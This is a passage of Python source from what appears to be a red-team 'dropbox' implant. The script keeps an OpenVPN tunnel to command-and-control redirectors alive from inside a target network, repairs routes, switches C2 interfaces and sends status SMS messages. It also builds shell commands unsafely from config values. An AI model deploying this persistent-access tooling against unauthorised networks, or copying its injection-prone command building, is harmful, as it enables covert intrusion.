	conn_name = wifi_ssid + "-" + interface

	# Check if it exists, create if it doesn't
	if not len(os.popen('sudo nmcli con show  | grep -i ' + conn_name).read().split("\n")[0]) > 0:
		os.popen('nmcli con add con-name ' + conn_name + ' ifname  ' + interface + ' type wifi ssid "' + wifi_ssid + '" 802-11-wireless-security.psk "' + wifi_pass + '" 802-11-wireless-security.key-mgmt wpa-psk ipv4.never-default yes')
		log_write("Setting up connection " + conn_name + " on interface " + interface)

	# Pause for a sec to allow NetworkMoron to catch up
	time.sleep(2)

	# Connect to the network
	log_write("Connecting to SSID " + wifi_ssid + " on interface " + interface)
	connect_command = "nmcli con up " + conn_name
	print("Connection command: " + connect_command)
	#os.popen(connect_command)

	p = subprocess.Popen(connect_command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()  
	#This makes the wait possible
	p_status = p.wait()

	time_in = time.time()
	max_time = 30.0

	# Wiat for a bit until the wireless interface comes up
	while (time.time() - time_in) < max_time:
		if is_ip(find_interface_ip(interface)):
			break
		else:
			time.sleep(1)

	#Sleep to allow the connection to come up
	#time.sleep(10)

	# Check if an IP was obtained
	conn_ip = os.popen('sudo nmcli con show ' + conn_name + ' | grep IP4.ADDRESS').read().split("\n")[0].split()# | awk -F\  "{print $2}"').read()[0]

	if conn_ip:
		print("Successfully connected")
		return True
	else:
		print("Connection unsuccessful")
		return False
	

'''def find_wireless_interface_gateway(interface):
	global STATIC_SETTINGS
	wifi_ssid = STATIC_SETTINGS['wireless_cnc']['wireless_cnc_ssid']
	conn_name = wifi_ssid + "-" + interface

	# Get gateway info from nmcli
	info = os.popen("nmcli con show " + conn_name + " | grep -i routers | grep -vi requested").read().split("\n")

	gateway = ""

	for i in range(len(info)):
		split = info[i].split()
		if len(split) >= 4:
			if is_ip(split[3]):
				gateway = split[3].strip()

	return gateway

def find_wired_interface_gateway(interface):
	global DYNAMIC_SETTINGS
	global STATIC_SETTINGS'''

# Note: Doesn't work for tun interface w/o redirection set, so this won't work for tuns.
def find_interface_gateway(interface):
	log_write("Trying to determine the gateway for " + interface)
	#Try getting the gateway from nmcli
	nmcli_gw = os.popen("nmcli device show " + interface + " | grep IP4.GATEWAY | awk -F\  '{print $2}'").read().split("\n")[0]

	gateway = ""

	# Check if it's an IP. If it isn't an IP, guess that the gateway is also the defined DNS server
	if is_ip(nmcli_gw):
		log_write("Found gateway " + nmcli_gw + " from IP4.GATEWAY for interface " + interface)
		gateway = nmcli_gw
	else:
		nmcli_dns = os.popen("nmcli device show " + interface + " | grep IP4.DNS | awk -F\  '{print $2}'").read().split("\n")[0]
		if is_ip(nmcli_dns):
			log_write("Found gateway " + nmcli_dns + " from IP4.DNS for interface " + interface)
			gateway = nmcli_dns

	# Still no gateway? Assume the gateway IP is x.x.x.1 based on the interface IP
	if not gateway:
		log_write("Unable to find gateway. Assuming the gateway is at x.x.x.1")
		ip = find_interface_ip(interface)
		split = ip.split(".")
		gateway = split[0] + "." + split[1] + "." + split[2] + ".1"
		log_write("Assumed gateway IP: " + gateway)

	return gateway

# Find gateway for tun. Assumed to be x.x.x.1 in the VPN address range
def find_tun_gateway(interface):
	log_write("Trying to determine the gateway for " + interface)
	#Try getting the gateway from nmcli
	nmcli_ip = os.popen("nmcli device show " + interface + " | grep IP4.ADDRESS | awk -F\  '{print $2}'").read().split("\n")[0]

	gateway = ""

	# Check if it's an IP. If it isn't an IP, guess that the gateway is also the defined DNS server
	if is_ip(nmcli_ip):
		log_write("Found tun IP " + nmcli_ip + " from IP4.ADDRESS for interface " + interface)
		split = nmcli_ip.split(".")

		gateway = split[0] + "." + split[1] + "." + split[2] + ".1"
		log_write("Assumed tun gateway: " + gateway)

	return gateway



def find_interface_ip(interface):
	log_write("Checking the IP of interface: " + interface)
	ip = os.popen("nmcli device show " + interface + "| grep IP4.ADDRESS | awk -F\  '{print $2}' | cut -d/ -f1").read().split("\n")[0]

	if is_ip(ip):
		log_write("Interface " + interface + " has IP: " + ip)
		return ip
	else:
		log_write("Couldn't find the IP of interface: " + interface)
		return ""



def add_init_routes():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	log_write("Adding initial routes for command and control")
	cnc_int = DYNAMIC_SETTINGS["cnc"]["active_cnc_int"]

	# Get the gateway for the command and control interface
	cnc_gw = find_interface_gateway(cnc_int)


	#Add routes for the redirectors
	for i in range(int(STATIC_SETTINGS['cnc']['num_redirectors'])):
		redir_string = "redirector_" + str(i)
		# Set the hostname_ip so we can add a route for it, and only proceed on success
		if set_redir_hostname_ip(i):
			time.sleep(1)
			route_cmd = "ip route add " + DYNAMIC_SETTINGS[redir_string]['hostname_ip'] + " via " + cnc_gw + " dev " + cnc_int
			log_write("Running route command: " + route_cmd)
			route_out = os.popen(route_cmd).read()
			print(route_out)

	# Add a route via the cnc interface for the backup nameserver

	route_cmd = "ip route add " + STATIC_SETTINGS['interfaces']['default_ns'] + " via " + cnc_gw + " dev " + cnc_int
	log_write("Running route command: " + route_cmd)
	route_out = os.popen(route_cmd).read()
	print(route_out)

def check_and_correct_routes():
	log_write("CHecking and attempting to correct routes.")

	cnc_int = DYNAMIC_SETTINGS["cnc"]["active_cnc_int"]
	cnc_gw = find_interface_gateway(cnc_int)

	routes = get_routes()

	primary_ip = DYNAMIC_SETTINGS['primary_int']['ip']
	primary_gw = DYNAMIC_SETTINGS['primary_int']['gateway']

	found_default = False
	# Is the default route going over the primary interface?
	if get_default_route_interface() == STATIC_SETTINGS['interfaces']['targ_net_int']:
		log_write("Default route is going over the primary interface.")
	else:

		for i in range(len(routes)):
			if re.match(".*default.*", routes[i]):
				found_default = True
				log_write("Default route incorrect: " + routes[i])


				# Before we go modify things, let's make sure that both are actually IPs
				if is_ip(primary_ip) and is_ip(primary_gw):
					# Delete the current route
					os.popen("ip route del " + routes[i])
					time.sleep(1)

					# Add back in a proper route
					route_cmd = "ip route add default via " + primary_gw + " dev " + STATIC_SETTINGS['interfaces']['targ_net_int']
					log_write("Adding route back: " + route_cmd)
					os.popen(route_cmd)
				else:
					log_write("Couldn't reset primary gateway. Either the primary interface IP or gateway was invalid.")
		if not found_default:
			log_write("No default interface found.")
			if is_ip(primary_ip) and is_ip(primary_gw):
				route_cmd = "ip route add default via " + primary_gw + " dev " + STATIC_SETTINGS['interfaces']['targ_net_int']
				log_write("Running route command: " + route_cmd)
				os.popen(route_cmd)

	# Are there default routes over anything but the primary interface? Delete them.
	for i in range(len(routes)):
		if re.match(".*default.*", routes[i]) and not re.match(".*dev\s+" + STATIC_SETTINGS['interfaces']['targ_net_int'] + ".*", routes[i]):
			log_write("Found a default route over the non-target network interface: " + routes[i])
			os.popen("ip route del " + routes[i])

	#Check routes for the redirectorsdef check_and_c
	for i in range(int(STATIC_SETTINGS['cnc']['num_redirectors'])):
		redir_string = "redirector_" + str(i)

		redir_ip = DYNAMIC_SETTINGS[redir_string]['hostname_ip']
		if is_ip(redir_ip):
			redir_ip_regex = redir_ip.replace(".","\.")
			found_route = False
			for j in range(len(routes)):
				if re.match(".*" + redir_ip_regex + ".*", routes[j]):
					found_route = True
					route_int = routes[j].split()[-1].strip()
					# If the found route isn't over the primary c2 interface, delete and rewrite it
					if not route_int == cnc_int:
						log_write("Route to redirector not over c2 interface: " + routes[j])
						os.popen("ip route del " + routes[j])
						time.sleep(1)
						route_cmd = "ip route add " + DYNAMIC_SETTINGS[redir_string]['hostname_ip'] + " via " + cnc_gw + " dev " + cnc_int
						log_write("Running route command: " + route_cmd)
						os.popen(route_cmd)
					else:
						log_write("Found route for " + redir_string + " on correct interface.")
			# Didn't find the route at all? Add it
			if not found_route:
				log_write("No route for redirector " + redir_string + " found.")
				route_cmd = "ip route add " + DYNAMIC_SETTINGS[redir_string]['hostname_ip'] + " via " + cnc_gw + " dev " + cnc_int
				log_write("Adding route: " + route_cmd)
				os.popen(route_cmd)

	# Check route for backup NS
	found_ns = False
	for i in range(len(routes)):
		ns_ip_regex = STATIC_SETTINGS['interfaces']['default_ns'].replace(".","\.")
		if re.match(".*" + ns_ip_regex + ".*", routes[i]):
			found_ns = True
			route_int = routes[i].split()[-1].strip()
			if not route_int == cnc_int:
				log_write("Route to backup nameserver not over c2 interface: " + routes[i])
				os.popen("ip route del " + routes[i])
				time.sleep(1)
				route_cmd = "ip route add " + STATIC_SETTINGS['interfaces']['default_ns'] + " via " + cnc_gw + " dev " + cnc_int
				log_write("Running route command: " + route_cmd)
				os.popen(route_cmd)
			else:
				log_write("Route to backup nameserver was found on the correct interface.")
	if not found_ns:
		log_write("No route found for backup nameserver.")
		route_cmd = "ip route add " + STATIC_SETTINGS['interfaces']['default_ns'] + " via " + cnc_gw + " dev " + cnc_int
		os.popen(route_cmd)


# Choose a redirector and port
def init_redir_and_port():
	global DYNAMIC_SETTINGS
	global STATIC_SETTINGS

	found_port = False

	log_write("Choosing an initial redirector and port")
	
	redirector_num = DYNAMIC_SETTINGS['cnc']['active_redirector']

	# Iterate through the redirectors. Check for one open port at a time
	while redirector_num < int( STATIC_SETTINGS['cnc']['num_redirectors'] ):
		redir_string = "redirector_" + str(redirector_num)

		# Find a port on the redirector
		curr_port = find_redir_port(redirector_num, False)
		curr_host = DYNAMIC_SETTINGS[redir_string]['host']

		# Found a port? Set found_port = True
		if curr_port:
			found_port = True

		if found_port:
			DYNAMIC_SETTINGS['cnc']['active_redirector'] = redirector_num
			DYNAMIC_SETTINGS['cnc']['active_redirector_port'] = curr_port
			DYNAMIC_SETTINGS['cnc']['active_redirector_host'] = curr_host
			log_write("Found redir combo - Redirector " + str(redirector_num) + " Port: " + str(curr_port)) 
			return True
		# Should have gone through all possible ports on the redirector. None found? Go to the next one
		else:
			redirector_num = redirector_num + 1

	# Only way to reach this point should be if no port was found on any redirector, so return False to indicate failure.
	# Successful redir/port combo should exit from the return True in the if is_open statement above.
	return False

def connect_openvpn():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	log_write("Connecting to OpenVPN server")

	# Make sure the routes are right before we do anything
	check_and_correct_routes()

	# Kill any previous openvpn connections just to be sure there aren't duplicates. Done by checking for tun interfaces.
	found_tun = False
	interfaces = netifaces.interfaces()
	for i in range(len(interfaces)):
		if re.match(".*tun.*", interfaces[i]):
			log_write("Found a tun interface " + interfaces[i] + ". Killing OpenVPN.")
			os.popen("pkill openvpn")

	openvpn_cmd = "openvpn --config " +  STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name'] + " --daemon"
	log_write("Starting the OpenVPN connection. Command: " + openvpn_cmd) 
	os.popen(openvpn_cmd)

# Generate the initial dynamic.cfg
def init_dynamic_config(verbose):
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	#  Create file information
	DYNAMIC_SETTINGS['file_info'] ={}
	DYNAMIC_SETTINGS['file_info']['gen_time'] = time.time()		# The time the dynamic.cfg was first generated
	DYNAMIC_SETTINGS['file_info']['update_time'] = time.time()	# When the dynamic configuration was last updated
	DYNAMIC_SETTINGS['file_info']['times_run'] = 0			# How many times the dynamic configuration has been used (updated at end, hence 0)

	# Create connection health info
	DYNAMIC_SETTINGS['health'] = {}
	DYNAMIC_SETTINGS['health']['fail_count'] = 0			# Total number of failed connections
	DYNAMIC_SETTINGS['health']['last_online'] = 0			# The time the dropbox was last online
	DYNAMIC_SETTINGS['health']['last_good'] = ""			# String for the last know working host + port combo


	DYNAMIC_SETTINGS['ints'] = {}					# Place to store a list of interfaces
	interfaces = netifaces.interfaces()
	for i in range(len(interfaces)):
		DYNAMIC_SETTINGS['ints'][interfaces[i]] = 1

	# Get primary interface information
	DYNAMIC_SETTINGS['primary_int'] = {}
	DYNAMIC_SETTINGS['primary_int']['ip'] = ""
	DYNAMIC_SETTINGS['primary_int']['gateway'] = ""
	DYNAMIC_SETTINGS['primary_int']['netmask'] = ""
	DYNAMIC_SETTINGS['primary_int']['nameserver'] = ""
	DYNAMIC_SETTINGS['primary_int']['broadcast'] = ""

	# Get information for the primary interface from syslog. If that fails, try netifaces. netifaces is the riskier/less accurate approach
	# Get this to store it in case the connection gets hosed later, especially default gw
	if not get_primary_int_settings_syslog():
		get_primary_int_settings_netifaces()



	num_cnc_int = int( STATIC_SETTINGS['cnc']['num_cnc_ints'])

	# Initialize the redirectors
	num_redirectors = int( STATIC_SETTINGS['cnc']['num_redirectors'] )
	log_write("Num redirectors: " + str(num_redirectors))

	for i in range(num_redirectors):
		sec_string = "redirector_" + str(i)
		DYNAMIC_SETTINGS[sec_string] = {}

		DYNAMIC_SETTINGS[sec_string]['checked_hostname'] = 'n'		# Indicates wether the hostname has been checked
		DYNAMIC_SETTINGS[sec_string]['checked_hostname_time'] = 0 	# Time hostname was checked
		DYNAMIC_SETTINGS[sec_string]['hostname_resolvable'] = ""	# Was the hostname resolvable when checked?
		DYNAMIC_SETTINGS[sec_string]['hostname_ip'] = ""		# The resolved hostname IP
		DYNAMIC_SETTINGS[sec_string]['exhausted_ports'] = 'n'	# Indicates all ports have been tested and found inaccessible
		DYNAMIC_SETTINGS[sec_string]['redir_failures'] = 0	# Initialize number of connection failures on interface to 0
		DYNAMIC_SETTINGS[sec_string]['host'] = ""		# The host we're going to use. Can be hostname or IP depending on config
		ports = comma_string_to_array( STATIC_SETTINGS['cnc']['cnc_ports_init'] )
		DYNAMIC_SETTINGS[sec_string]['num_ports'] = len(ports)
		for j in range(len(ports)):
			DYNAMIC_SETTINGS[sec_string]["redir_ports_" + str(j) + "_portnum"] = ports[j]	# The actual port number
			DYNAMIC_SETTINGS[sec_string]["redir_ports_" + str(j) + "_port_open"] = ""		# Is the port open from this interface? Blank = not scanned yet

	# Pick the CNC interface to be the first entered CNC interface
	DYNAMIC_SETTINGS['cnc'] = {}
	DYNAMIC_SETTINGS['cnc']['active_cnc_int'] = STATIC_SETTINGS['cnc_int_0']['name']
	DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] = STATIC_SETTINGS['cnc_int_0']['type']
	DYNAMIC_SETTINGS['cnc']['active_redirector'] = 0
	DYNAMIC_SETTINGS['cnc']['active_redirector_port'] = ""
	DYNAMIC_SETTINGS['cnc']['active_redirector_host'] = ""

	# Store info about notifications
	DYNAMIC_SETTINGS['notify'] = {}
	DYNAMIC_SETTINGS['notify']['last_status'] = 0
	DYNAMIC_SETTINGS['notify']['last_fail'] = 0

	# Initialize redirectors
	#num_redirectors = int( STATIC_SETTINGS['cnc']['num_redirectors'] )

	#for i in range(num_redirectors):
	#	DYNAMIC_SETTINGS['cnc']["redirector_" + str(i) + "_exhausted_ports"] = 'n'		# Have all ports failed out on redirector n

	if verbose:
		for section in DYNAMIC_SETTINGS:
			for setting in DYNAMIC_SETTINGS[section]:
				print("[" + section + "][" + setting + "]: " + str(DYNAMIC_SETTINGS[section][setting]))

# Checks the age of the dynamic configuration, and returns its age in seconds.
def check_dynamic_config_age():
	if os.path.exists(DYNAMIC_FULL_PATH):
		tempconfig = parse_config(DYNAMIC_FULL_PATH, False)
		age = time.time() - float(tempconfig['file_info']['gen_time'])
		return age
	else:
		return 0

def get_uptime():  
    with open('/proc/uptime', 'r') as f:
        uptime_seconds = float(f.readline().split()[0])
        log_write("System uptime: " + str(uptime_seconds))
        return uptime_seconds

def do_init_setup():
	log_write("Doing initial setup")
	init_dynamic_config(True)

	log_write("Initializing C2 interface")
	# If cnc interface is wireless, connect to wireless
	if DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] == 'wireless':
		log_write("Initializing wireless interface.")
		connect_wifi(DYNAMIC_SETTINGS['cnc']['active_cnc_int'])
	# Ethernet connection? Make sure it has an address
	if DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] == 'ethernet':
		log_write("Checking that Ethernet interface has an IP")
		if not find_interface_ip(DYNAMIC_SETTINGS['cnc']['active_cnc_int']):
			log_write("Interface " + DYNAMIC_SETTINGS['cnc']['active_cnc_int'] + " had no IP. Trying to get a DHCP lease.")
			os.popen("dhclient " + DYNAMIC_SETTINGS['cnc']['active_cnc_int'])

	# Add the initial routes for command and control
	log_write("Adding initial routes")
	add_init_routes()

	# Pick a redirector/port combo
	log_write("Finding inital redirector and port")
	init_redir_and_port()

	# Create the VPN config based on the redirector/port combo
	log_write("Creating the initial VPN configuration from a template")
	vpn_file_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name']
	template_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['cnc']['redir_vpn_config_' + str(DYNAMIC_SETTINGS['cnc']['active_redirector']) ]
	create_openvpn_config(vpn_file_name,template_name, DYNAMIC_SETTINGS['cnc']['active_redirector_host'], DYNAMIC_SETTINGS['cnc']['active_redirector_port'])

	# Start the OpenVPN connection
	log_write("Creating initial OpenVPN connection")
	connect_openvpn()



####################################################
#
# Main
#
####################################################

# Get the log file name. Done seperately so we can immediately start logging, including during parsing of the config file
LOG_FILE = get_log_name(sys.argv[1])

log_write("")
log_write("#########################################")
log_write("# New Run")
log_write("#########################################")
log_write("")

# Parse static configuation settings
log_write("Parsing static configuration")
log_write("")
STATIC_SETTINGS = parse_config(sys.argv[1], False)

DYNAMIC_FULL_PATH = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['dynamic_file_name']

FRESH_BOOT = False


# Check if dynamic configuration exists
#if os.path.isfile(DYNAMIC_FILENAME):
#	update_config(DYNAMIC_FILENAME)

# If there's no dynamic configuration present, or the file exists but the age is below the boot threshold, or the configuration file is stale, go through initial setup
if not os.path.exists(DYNAMIC_FULL_PATH):
	log_write("Dynamic configuration file was absent.")
	FIRST_RUN = True
elif get_uptime() < float(STATIC_SETTINGS['cnc']['delete_on_boot_thresh']) and STATIC_SETTINGS['cnc']['delete_on_boot'] == 'y':
	# Let's only do this once per reboot.
	if not check_dynamic_config_age() < float(STATIC_SETTINGS['cnc']['delete_on_boot_thresh']):
		log_write("Freshly booted system. Redo configs.")
		make_clean()
		FIRST_RUN = True
		FRESH_BOOT = True
elif check_dynamic_config_age() > float(STATIC_SETTINGS['cnc']['exp_time']):
	log_write("Dynamic configuration was stale. Redoing initial setup.")
	make_clean()
	FIRST_RUN = True
else:
	log_write("Dynamic configuration exists and passes checks. Using current config on disk.")
	FIRST_RUN = False

if FIRST_RUN:
	log_write("First run")
	do_init_setup()
	if FRESH_BOOT:
		time.sleep(2)
		on_boot_sms()
# If not the first run, initial setup isn't required. Check the health of the connection and try to fix things that are broken.
else:
	# Load the dynamic settings
	DYNAMIC_SETTINGS = parse_config(DYNAMIC_FULL_PATH, False)

	# Check and correct routes
	check_and_correct_routes()

	#Check the status of the VPN connection
	check_fail = check_vpn_conn()

	if check_fail:
		fail_time = time.time() - float(DYNAMIC_SETTINGS['notify']['last_fail'])
		if fail_time > float(STATIC_SETTINGS['notify']['fail_thresh']):
			failure_sms(check_fail)
			DYNAMIC_SETTINGS['notify']['last_fail'] = time.time()
		log_write("Connection failed. Reason: " + check_fail)
		log_write("Trying to restart the connection")
		connect_openvpn()
		time.sleep(5)
		log_write("Rerunning VPN check")
		recheck = check_vpn_conn()
		if recheck:
			log_write("Restarting failed. Reason: " + recheck + ". Trying to troubleshoot the connection.")
			if troubleshoot_conn(recheck):
				log_write("Troubleshooting worked. Restarting connection.")
				connect_openvpn()
		else:
			log_write("Restarting the connection worked")

status_time = time.time() - float(DYNAMIC_SETTINGS['notify']['last_status'])
if status_time > float(STATIC_SETTINGS['notify']['status_thresh']):
	DYNAMIC_SETTINGS['notify']['last_status'] = time.time()
	status_sms()

dump_dynamic_config()
#get_primary_int_settings()

#check_port('54.87.75.98','443')
